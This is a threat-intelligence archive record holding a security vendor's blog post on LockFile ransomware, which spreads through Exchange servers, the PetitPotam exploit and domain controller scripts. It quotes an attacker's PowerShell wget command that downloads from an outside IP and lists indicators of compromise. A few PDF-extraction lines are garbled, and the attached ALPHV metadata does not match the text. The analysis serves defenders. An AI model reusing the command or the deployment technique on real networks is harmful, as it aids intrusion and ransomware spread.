{
    "id": "6e8803dc-1783-4555-b56e-6ead7ddb5d7b",
    "created_at": "2023-01-12T15:09:08.330068Z",
    "updated_at": "2025-03-27T02:05:58.269717Z",
    "deleted_at": null,
    "sha1_hash": "d008de744827733613ca9b1d1afd2b4e2ea3ede5",
    "title": "2021-08-20 - LockFile- Ransomware Uses PetitPotam Exploit to Compromise Windows Domain Controllers",
    "authors": "",
    "file_creation_date": "2022-05-28T23:14:45Z",
    "file_modification_date": "2022-05-28T23:14:45Z",
    "file_size": 980497,
    "plain_text": "# LockFile: Ransomware Uses PetitPotam Exploit to Compromise Windows Domain Controllers\n\n**[symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockfile-ransomware-new-petitpotam-windows](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockfile-ransomware-new-petitpotam-windows)**\n\nThreat Hunter TeamSymantec\n\n## Previously unseen ransomware hit at least 10 organizations in ongoing campaign.\n\n**_UPDATE August 23: Third parties have identified a ProxyShell exploit as a potential vector for the PowerShell-related commands that are_**\n_[identified in this blog. Researcher Kevin Beaumont first spotted that ProxyShell was being exploited from 209.14.0[.]234 on August 13. The](https://doublepulsar.com/multiple-threat-actors-including-a-ransomware-gang-exploiting-exchange-proxyshell-vulnerabilities-c457b1655e9c)_\n_[ProxyShell and LockFile link is also mentioned in this Twitter thread. Protection information has been updated below based on this new](https://twitter.com/VirITeXplorer/status/1428750497872232459)_\n_information._\n\nWhat appears to be a new ransomware family is being used to target victims in various industries around the globe.\n\n\n-----\n\ne oc e a so a e as st obse ed o t e et o o a U S a c a o ga at o o Ju y 0, 0, t ts atest act ty see as\nrecently as August 20. LockFile has been seen on organizations around the world, with most of its victims based in the U.S. and Asia.\n\nIndications are that the attackers gain access to victims' networks via Microsoft Exchange Servers, and then use the incompletely patched\nPetitPotam vulnerability to gain access to the domain controller, and then spread across the network. It is not clear how the attackers gain\ninitial access to the Microsoft Exchange Servers.\n\nVictims are in the manufacturing, financial services, engineering, legal, business services, and travel and tourism sectors.\n\nThe attackers behind this ransomware use a ransom note with a similar design to that used by the LockBit ransomware gang (Figure 1) and\n[reference the Conti gang in the email address they use - [email protected][.]com.](http://10.10.0.46/cdn-cgi/l/email-protection)\n\nFigure 1. The LockFile ransom note\n\n## Attack chain\n\nExchange servers are compromised through an as yet unidentified technique. On exploitation, the attacker executes a PowerShell command\nsuch as the following:\n\n_powershell wget hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH_\n\nOther powershell wget commands to the same IP address use similar seemingly random high port numbers. It is unknown exactly what is\ndownloaded by the PowerShell command; however, the attackers maintain access on victim networks for at least several days before\nbeginning the ransomware attack.\n\nTypically around 20 to 30 minutes prior to deploying ransomware, the attackers install a set of tools onto the compromised Exchange Server.\nIncluded in these tools is:\n\n[An exploit for the CVE-2021-36942 vulnerability (aka PetitPotam). The code appears to be copied from](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)\n[https://github.com/zcgonvh/EfsPotato. This is in a file called “efspotato.exe”.](https://github.com/zcgonvh/EfsPotato)\n\nTwo files: active_desktop_render.dll and active_desktop_launcher.exe\n\nThe active_desktop_launcher.exe is a legitimate version of KuGou Active Desktop. The executable is being used in a DLL search order\nloading attack to load a malicious active_desktop_render.dll file. This active_desktop_render.dll file, when loaded by the\nactive_desktop_launcher.exe, attempts to load and decrypt a file in the local directory called “desktop.ini”. If the file is successfully loaded and\ndecrypted, shellcode from the file is executed. As the investigation into these attacks is ongoing, a copy of “desktop.ini” has yet to be retrieved\nfor analysis.\n\nThe encrypted shellcode, however, very likely activates the efspotato.exe file that exploits PetitPotam. This is an NTLM relay attack bug that\ncan be used by a low-privileged attacker to take over a domain controller. It was patched in [Microsoft’s August Patch Tuesday release, but it](https://krebsonsecurity.com/2021/08/microsoft-patch-tuesday-august-2021-edition/?utm_campaign=Feed%3A%20KrebsOnSecurity%20%28Krebs%20on%20Security%29&utm_medium=feed&_hsmi=148529577&_hsenc=p2ANqtz-9-Q86M_LhMermZv3VTYBG80fMMKFQlRvsj6b22s44Y_A72OsxFnX4WslFadDplOE793UWfnc_1j900D2PVIcoZscsrwJqvAnIgDAj5wGcgQwDDrzI&utm_source=feedburner)\nsubsequently emerged that the fix released reportedly did not fully patch the vulnerability.\n\nOnce access has been gained to the local domain controller, the attackers copy over the LockFile ransomware, along with a batch file and\n[supporting executables, onto the domain controller. These files are copied into the “sysvol\\domain\\scripts” directory. This directory is used to](https://social.technet.microsoft.com/wiki/contents/articles/8548.active-directory-sysvol-and-netlogon.aspx)\ndeploy scripts to network clients when they authenticate to the domain controller. This means that any clients that authenticate to the domain\nafter these files have been copied over will execute them.\n\nThe files that are copied into the Sysvol directory are:\n\nAutologin.bat\nAutologin.exe\nAutologin.dll\nAutologin.sys\nAutoupdate.exe\n\n\n-----\n\ne utoupdate e e e s a a a t o t e oc e pay oad, c s u que to eac o ga at o ta geted\n\nThe Autologin.exe, Autlogin.dll, and Autologin.sys files are all part of a toolkit called the Kernel Driver Utility (KDU [https://github.com/hfiref0x/KDU). Autologin.dll is the “Tanikaze.dll” component, and the autologin.exe is the “Hamakaze” component. It is](https://github.com/hfiref0x/KDU)\ncurrently unclear exactly how the KDU tool is utilized by the attacker in conjunction with the ransomware. Regardless of how they are utilized,\nthe LockFile ransomware is ultimately executed.\n\n## A new threat?\n\nLockFile appears to be a new threat on the already crowded ransomware landscape. The investigation into this threat, and whether it may\nhave links to any previously seen or retired ransomware threats continues. This is an ongoing investigation and Symantec, part of Broadcom\nSoftware, may update this blog with new information if it comes to light.\n\n## Protection\n\nThe following protections are in place to protect customers against LockFile attacks:\n\n**File-based**\n\nRansom.Lockfile\nRansom.CryptoTorLocker\n\n**Network-based**\n\nOS Attack: SMB EFS NTLM Relay Attempt\nAudit: SMB EFS NTLM Relay Attempt 2\nWeb Attack: Microsoft Exchange Server RCE CVE-2021-34473\nWeb Attack: Microsoft Exchange Server Elevation of Privilege CVE-2021-34523\n\n[For the latest protection updates, please visit the Symantec Protection Bulletin.](https://www.broadcom.com/support/security-center/protection-bulletin)\n\n**Policy-based**\n\nSymantec Data Center Security default hardening policies for Microsoft Exchange servers and Windows Domain Controllers protect against\nProxyShell vulnerabilities and prevent LockFile ransomware attacks on Domain Controllers.\n\n## Indicators of Compromise\n\n**SHA256 Hashes** **MD5 Hashes** **Description**\n\ned834722111782b2931e36cfa51b38852c813e3d7a4d16717f59c1d037b62291 957af740e1d88fabdaf73bd619cb3d31 active_desktop_rend\n\ncafe54e85c539671c94abdeb4b8adbef3bde8655006003088760d04a86b5f915 f08e24f57501f2c4e009b6a7d9249e99 autoupdate.exe\n\n36e8bb8719a619b78862907fd49445750371f40945fefd55a9862465dc2930f9 bc70a7b384558cafbbc04f00a59cbe8d autologin.sys\n\n5a08ecb2fad5d5c701b4ec42bd0fab7b7b4616673b2d8fbd76557203c5340a0f 8ed32ace2fbce50296d3a1a16d963ba7 autologin.exe\n\n1091643890918175dc751538043ea0743618ec7a5a9801878554970036524b75 8d17765168677ef76400b497fb0c0fd3 autologin.dll\n\n2a23fac4cfa697cc738d633ec00f3fbe93ba22d2498f14dea08983026fdf128a 1f0a89360bb9471af8b2b1136eafd65f autoupdate.exe\n\n7bcb25854ea2e5f0b8cfca7066a13bc8af8e7bac6693dea1cdad5ef193b052fd 335b9a537a380ec5936a7210ad64d955 efspotato.exe\n\nc020d16902bd5405d57ee4973eb25797087086e4f8079fac0fd8420c716ad153 2163489886929ffc596983d42965a670 active_desktop_rend\n\na926fe9fc32e645bdde9656470c7cd005b21590cda222f72daf854de9ffc4fe0 ef37842fc159631f9dd8f94c5e05a674 autoupdate.exe\n\n368756bbcaba9563e1eef2ed2ce59046fb8e69fb305d50a6232b62690d33f690 435b568f7ac982b58ab86e8680d9042e autologin.sys\n\nd030d11482380ebf95aea030f308ac0e1cd091c673c7846c61c625bdf11e5c3a 49dd23214007c7f839eebcd83a3c9465 autoupdate.exe\n\na0066b855dc93cf88f29158c9ffbbdca886a5d6642cbcb9e71e5c759ffe147f8 d51dff297c293bac5871a9b82e982103 autoupdate.exe\n\nbf315c9c064b887ee3276e1342d43637d8c0e067260946db45942f39b970d7ce 52e1fed4c521294c5de95bba958909c1 LockFile\n\nIP address:\n\n209.14.0.234\n\n\n-----\n\n## About the Author\n\n### Threat Hunter Team\n\n**Symantec**\n\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced\nprotection in Symantec products, and offer analysis that helps customers respond to attacks.\n\n## Want to comment on this post?\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-20 - LockFile- Ransomware Uses PetitPotam Exploit to Compromise Windows Domain Controllers.pdf"
    ],
    "report_names": [
        "2021-08-20 - LockFile- Ransomware Uses PetitPotam Exploit to Compromise Windows Domain Controllers.pdf"
    ],
    "threat_actors": [
        {
            "id": "6e23ce43-e1ab-46e3-9f80-76fccf77682b",
            "created_at": "2022-10-25T16:07:23.303713Z",
            "updated_at": "2025-03-27T02:02:09.727245Z",
            "deleted_at": null,
            "main_name": "ALPHV",
            "aliases": [
                "ALPHV",
                "ALPHVM",
                "BlackCat Gang",
                "UNC4466"
            ],
            "source_name": "ETDA:ALPHV",
            "tools": [
                "ALPHV",
                "ALPHVM",
                "BlackCat",
                "GO Simple Tunnel",
                "GOST",
                "Impacket",
                "LaZagne",
                "MEGAsync",
                "Mimikatz",
                "Munchkin",
                "Noberus",
                "PsExec",
                "Remcom",
                "RemoteCommandExecution",
                "WebBrowserPassView"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536148,
    "ts_updated_at": 1743041158,
    "ts_creation_date": 1653779685,
    "ts_modification_date": 1653779685,
    "files": {
        "pdf": "https://archive.orkl.eu/d008de744827733613ca9b1d1afd2b4e2ea3ede5.pdf",
        "text": "https://archive.orkl.eu/d008de744827733613ca9b1d1afd2b4e2ea3ede5.txt",
        "img": "https://archive.orkl.eu/d008de744827733613ca9b1d1afd2b4e2ea3ede5.jpg"
    }
}